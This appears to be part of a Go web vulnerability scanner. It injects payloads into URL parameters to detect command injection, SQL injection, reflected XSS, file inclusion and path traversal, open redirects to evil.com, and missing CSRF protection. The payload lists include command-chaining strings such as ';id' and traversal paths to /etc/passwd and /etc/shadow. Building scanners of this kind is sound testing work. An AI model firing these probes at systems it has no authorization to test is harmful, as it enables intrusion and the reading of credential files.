package main

import (
	"fmt"
	"regexp"
	"strings"
	"time"
	"net/url"
)

var sqliPattern = regexp.MustCompile(`(?i)(sql syntax|mysql_fetch|mysql_num_rows|division by zero|ORA-01756|SQLSTATE|ODBC|Syntax error|Unclosed|Microsoft OLE DB|Warning: mysql_|You have an error in your SQL syntax|SQLite3::|PG::|PostgreSQL|Microsoft SQL|Syntax error in string in query expression|Incorrect syntax near|Unclosed quotation mark)`)
var lfiPattern = regexp.MustCompile(`(?i)(root:x:0:0:|/bin/bash|[a-z]:\\windows\\|\\[boot loader\\]|\\[operating systems\\]|\\[drivers\\]|\\[fonts\\]|\\[extensions\\]|\\[mci extensions\\]|\\[files\\]|\\[debug\\]|\\[386enh\\]|\\[network\\])`)

func scanRCEMarker(cfg *ScanConfig, param string, baseVal string, origVal string, baseURL string, params url.Values) bool {
	found := false
	marker := "pwntwomarker"
	ipBase := baseVal
	if ipBase == "" || !isLikelyIP(ipBase) {
		ipBase = "127.0.0.1"
	}
	payloads := []string{
		ipBase + ";echo " + marker,
		ipBase + "|echo " + marker,
		ipBase + "&&echo " + marker,
		ipBase + "&echo " + marker,
		ipBase + ";id",
		ipBase + "|id",
		ipBase + "&&id",
		ipBase + "&id",
	}
	for _, payload := range payloads {
		params.Set(param, payload)
		var respBody string
		var reqErr error
		if strings.ToUpper(cfg.Method) == "POST" {
			respBody, _, reqErr = fetchURL(cfg, baseURL, "POST", params, nil)
		} else {
			urlWithParams := baseURL + "?" + params.Encode()
			respBody, _, reqErr = fetchURL(cfg, urlWithParams, "GET", nil, nil)
		}
		if reqErr != nil {
			debugPrintf(cfg, "[!] RCE request error: %v", reqErr)
			continue
		}
		if strings.Contains(respBody, marker) || regexp.MustCompile(`uid=\d+\(.+\)`).MatchString(respBody) {
			fmt.Printf("%s[!!!] VULNERABILITY FOUND: COMMAND INJECTION / RCE%s\n", ColorRed, ColorReset)
			fmt.Printf("%s[*] Parameter: %s%s\n", ColorYellow, param, ColorReset)
			fmt.Printf("%s[*] Payload: %s%s\n", ColorYellow, payload, ColorReset)
			fmt.Printf("%s[*] POC: %s%s\n", ColorYellow, cfg.URL, ColorReset)
			found = true
		}
		time.Sleep(350 * time.Millisecond)
		params.Set(param, origVal)
	}
	return found
}

func isLikelyIP(s string) bool {
	ipPattern := `^(\d{1,3}\.){3}\d{1,3}$`
	return regexp.MustCompile(ipPattern).MatchString(s)
}

func scanBooleanSQLi(cfg *ScanConfig, param string, baseVal string, origVal string, baseURL string, params url.Values) bool {
	truePayload := baseVal + "1' OR 1=1 -- "
	falsePayload := baseVal + "1' AND 1=2 -- "

	params.Set(param, truePayload)
	respTrue, _, err1 := fetchURL(cfg, baseURL+"?"+params.Encode(), "GET", nil, nil)
	params.Set(param, falsePayload)
	respFalse, _, err2 := fetchURL(cfg, baseURL+"?"+params.Encode(), "GET", nil, nil)
	params.Set(param, origVal)

	if err1 != nil || err2 != nil {
		debugPrintf(cfg, "[!] Boolean-based SQLi request error")
		return false
	}

	normalize := func(s string) string {
		return strings.ToLower(strings.Join(strings.Fields(s), ""))
	}

	if normalize(respTrue) != normalize(respFalse) {
		fmt.Printf("%s[!!!] POSSIBLE BOOLEAN-BASED SQL INJECTION in parameter '%s'!%s\n", ColorRed, param, ColorReset)
		fmt.Printf("%s[*] True payload: %s%s\n", ColorYellow, truePayload, ColorReset)
		fmt.Printf("%s[*] False payload: %s%s\n", ColorYellow, falsePayload, ColorReset)
		return true
	}
	return false
}

// XSS scan function (basic reflected XSS detection)
func scanXSS(cfg *ScanConfig, param string, baseVal string, origVal string, baseURL string, params url.Values) int {
	xssPayloads := []string{
		"<script>alert('xss1')</script>",
		"\"'><img src=x onerror=alert('xss2')>",
		"'><svg/onload=alert('xss3')>",
	}
	found := 0
	for _, payload := range xssPayloads {
		params.Set(param, baseVal+payload)
		var respBody string
		var reqErr error
		if strings.ToUpper(cfg.Method) == "POST" {
			respBody, _, reqErr = fetchURL(cfg, baseURL, "POST", params, nil)
		} else {
			urlWithParams := baseURL + "?" + params.Encode()
			respBody, _, reqErr = fetchURL(cfg, urlWithParams, "GET", nil, nil)
		}
		if reqErr != nil {
			debugPrintf(cfg, "[!] XSS request error: %v", reqErr)
			continue
		}
		if strings.Contains(respBody, payload) {
			fmt.Printf("%s[!!!] VULNERABILITY FOUND: XSS%s\n", ColorRed, ColorReset)
			fmt.Printf("%s[*] Type: XSS%s\n", ColorYellow, ColorReset)
			fmt.Printf("%s[*] Parameter: %s%s\n", ColorYellow, param, ColorReset)
			fmt.Printf("%s[*] Payload: %s%s\n", ColorYellow, payload, ColorReset)
			fmt.Printf("%s[*] POC: %s%s\n", ColorYellow, cfg.URL, ColorReset)
			found++
		}
		time.Sleep(350 * time.Millisecond)
		params.Set(param, origVal)
	}
	return found
}

func scanSQLi(cfg *ScanConfig, param string, baseVal string, origVal string, baseURL string, params url.Values) int {
	sqliPayloads := []string{
		"'", "\"", "';", "\";", "'--", "\"--", "'#", "\"#", " OR 1=1--", " OR 1=1#", " OR '1'='1'", " OR \"1\"=\"1\"",
		"' or sleep(5)--", "\" or sleep(5)--", "' OR 1=1 LIMIT 1--", "\" OR 1=1 LIMIT 1--", "admin' --",
	}
	found := 0
	for _, payload := range sqliPayloads {
		params.Set(param, baseVal+payload)
		var respBody string
		var reqErr error

		if strings.ToUpper(cfg.Method) == "POST" {
			respBody, _, reqErr = fetchURL(cfg, baseURL, "POST", params, nil)
		} else {
			urlWithParams := baseURL + "?" + params.Encode()
			respBody, _, reqErr = fetchURL(cfg, urlWithParams, "GET", nil, nil)
		}
		if reqErr != nil {
			debugPrintf(cfg, "[!] SQLi request error: %v", reqErr)
			continue
		}
		if sqliPattern.MatchString(respBody) {
			fmt.Printf("%s[!!!] VULNERABILITY FOUND: SQL INJECTION%s\n", ColorRed, ColorReset)
			fmt.Printf("%s[*] Parameter: %s%s\n", ColorYellow, param, ColorReset)
			fmt.Printf("%s[*] Payload: %s%s\n", ColorYellow, baseVal+payload, ColorReset)
			fmt.Printf("%s[*] POC: %s%s\n", ColorYellow, cfg.URL, ColorReset)
			found++
		}
		time.Sleep(350 * time.Millisecond)
		params.Set(param, origVal)
	}
	return found
}

func scanLFI(cfg *ScanConfig, param string, baseVal string, origVal string, baseURL string, params url.Values) int {
	lfiPayloads := []string{
		"../../../../../../../../etc/passwd",
		"..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
		"../../../../../../../../windows/win.ini",
		"../../../../../../../../boot.ini",
		"../../../../../../../../etc/hosts",
		"../../../../../../../../etc/shadow",
		"/etc/passwd",
		"/windows/win.ini",
		"php://filter/convert.base64-encode/resource=index.php",
	}
	found := 0
	// Get baseline response for false-positive reduction
	urlWithParams := baseURL + "?" + params.Encode()
	baseRespBody, _, _ := fetchURL(cfg, urlWithParams, "GET", nil, nil)
	for _, payload := range lfiPayloads {
		params.Set(param, payload)
		var respBody string
		var reqErr error

		if strings.ToUpper(cfg.Method) == "POST" {
			respBody, _, reqErr = fetchURL(cfg, baseURL, "POST", params, nil)
		} else {
			urlWithParams := baseURL + "?" + params.Encode()
			respBody, _, reqErr = fetchURL(cfg, urlWithParams, "GET", nil, nil)
		}
		if reqErr != nil {
			debugPrintf(cfg, "[!] LFI request error: %v", reqErr)
			continue
		}
		// Only report if pattern is present in payloaded response but not in baseline
		if lfiPattern.MatchString(respBody) && !lfiPattern.MatchString(baseRespBody) {
			fmt.Printf("%s[!!!] VULNERABILITY FOUND: LFI/RFI%s\n", ColorRed, ColorReset)
			fmt.Printf("%s[*] Parameter: %s%s\n", ColorYellow, param, ColorReset)
			fmt.Printf("%s[*] Payload: %s%s\n", ColorYellow, payload, ColorReset)
			fmt.Printf("%s[*] POC: %s%s\n", ColorYellow, cfg.URL, ColorReset)
			found++
		}
		time.Sleep(350 * time.Millisecond)
		params.Set(param, origVal)
	}
	return found
}

// Open Redirect scan: fixed version, handles headers as []string
func scanOpenRedirect(cfg *ScanConfig, param string, baseVal string, origVal string, baseURL string, params url.Values) bool {
	payload := "https://evil.com"
	params.Set(param, payload)

	urlWithParams := baseURL + "?" + params.Encode()
	respBody, headers, err := fetchURL(cfg, urlWithParams, "GET", nil, nil)
	params.Set(param, origVal) // Restore original

	if err != nil {
		debugPrintf(cfg, "[!] Open Redirect request error: %v", err)
		return false
	}

	// Check for Location header with our payload
	if locs, ok := headers["Location"]; ok && len(locs) > 0 && strings.HasPrefix(locs[0], payload) {
		fmt.Printf("%s[!!!] VULNERABILITY FOUND: OPEN REDIRECT%s\n", ColorRed, ColorReset)
		fmt.Printf("%s[*] Parameter: %s%s\n", ColorYellow, param, ColorReset)
		fmt.Printf("%s[*] Payload: %s%s\n", ColorYellow, payload, ColorReset)
		fmt.Printf("%s[*] POC: %s%s\n", ColorYellow, urlWithParams, ColorReset)
		return true
	}

	// Some apps reflect the URL in the body instead
	if strings.Contains(respBody, payload) {
		fmt.Printf("%s[!!!] POSSIBLE OPEN REDIRECT (payload reflected in body)%s\n", ColorRed, ColorReset)
		fmt.Printf("%s[*] Parameter: %s%s\n", ColorYellow, param, ColorReset)
		fmt.Printf("%s[*] Payload: %s%s\n", ColorYellow, payload, ColorReset)
		fmt.Printf("%s[*] POC: %s%s\n", ColorYellow, urlWithParams, ColorReset)
		return true
	}

	return false
}

// Path Traversal scan function
func scanPathTraversal(cfg *ScanConfig, param, baseVal, origVal, baseURL string, params url.Values) int {
	payloads := []string{
		"../../../../../../../../etc/passwd",
		"..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
		"../../../../../../../../boot.ini",
		"../../../../../../../../etc/hosts",
		"../../../../../../../../etc/shadow",
		"/etc/passwd",
		"/windows/win.ini",
	}
	signatures := []string{"root:x:0:0:", "[extensions]", "[fonts]", "[boot loader]", "[drivers]", "[operating systems]", "[mci extensions]", "[files]", "[debug]", "[386enh]", "[network]"}
	found := 0
	for _, payload := range payloads {
		params.Set(param, payload)
		var respBody string
		var reqErr error

		if strings.ToUpper(cfg.Method) == "POST" {
			respBody, _, reqErr = fetchURL(cfg, baseURL, "POST", params, nil)
		} else {
			urlWithParams := baseURL + "?" + params.Encode()
			respBody, _, reqErr = fetchURL(cfg, urlWithParams, "GET", nil, nil)
		}
		if reqErr != nil {
			debugPrintf(cfg, "[!] Path Traversal request error: %v", reqErr)
			continue
		}
		for _, sig := range signatures {
			if strings.Contains(respBody, sig) {
				fmt.Printf("%s[!!!] VULNERABILITY FOUND: PATH TRAVERSAL%s\n", ColorRed, ColorReset)
				fmt.Printf("%s[*] Parameter: %s%s\n", ColorYellow, param, ColorReset)
				fmt.Printf("%s[*] Payload: %s%s\n", ColorYellow, payload, ColorReset)
				fmt.Printf("%s[*] POC: %s%s\n", ColorYellow, cfg.URL, ColorReset)
				found++
				break
			}
		}
		time.Sleep(350 * time.Millisecond)
		params.Set(param, origVal)
	}
	return found
}

// CSRF scan function
func scanCSRF(cfg *ScanConfig, pageURL, param, baseVal, origVal, baseURL string, params url.Values) int {
	pageBody, headers, err := fetchURL(cfg, pageURL, "GET", nil, nil)
	if err != nil {
		debugPrintf(cfg, "[!] CSRF scan request error: %v", err)
		return 0
	}

	// 1. Check for CSRF token in forms
	csrfIndicators := []string{"csrf", "token", "authenticity_token", "nonce"}
	foundToken := false

	for _, indicator := range csrfIndicators {
		if strings.Contains(strings.ToLower(pageBody), indicator) {
			foundToken = true
			break
		}
	}

	// 2. Check for SameSite/secure cookies (basic header check)
	setCookie := headers.Get("Set-Cookie")
	cookieSafe := strings.Contains(strings.ToLower(setCookie), "samesite") || strings.Contains(strings.ToLower(setCookie), "secure")

	if !foundToken || !cookieSafe {
		fmt.Printf("%s[!!!] POSSIBLE CSRF RISK: No anti-CSRF tokens detected in forms or insecure cookie flags present.%s\n", ColorRed, ColorReset)
		return 1
	}
	return 0
}

// Add this function for scanning a page for file upload forms, with debug HTML print.
func scanAndParseFileUploadForms(cfg *ScanConfig, pageURL string) {
	pageBody, _, err := fetchURL(cfg, pageURL, "GET", nil, nil)
	if err != nil {
		fmt.Printf("[!] Error fetching %s: %v\n", pageURL, err)
		return
	}

	// Debug print of HTML being parsed
	if cfg.Debug {
		fmt.Println("==== PAGE HTML START ====")
		fmt.Println(pageBody)
		fmt.Println("==== PAGE HTML END ====")
	}

	forms := findFileUploadForms(pageBody)
	scanFileUploadForms(cfg, pageURL, forms)
}